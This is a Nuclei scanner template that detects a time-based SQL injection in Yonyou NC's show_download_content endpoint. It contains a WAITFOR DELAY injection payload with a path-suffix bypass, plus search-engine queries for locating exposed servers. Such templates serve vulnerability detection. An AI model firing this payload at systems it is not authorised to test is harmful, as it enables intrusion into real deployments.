id: Yonyou_NC_show_download_content_SQLi

info:
  name: Yonyou_NC_show_download_content_SQLi
  author: HK
  severity: high
  description: 用友NC show_download_content SQL注入
  metadata:
    max-request: 1
    Fofa-query: body="../Client/Uclient/UClient.dmg"
    Quake-query: body="../Client/Uclient/UClient.dmg"
    Hunter-query: body="../Client/Uclient/UClient.dmg"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'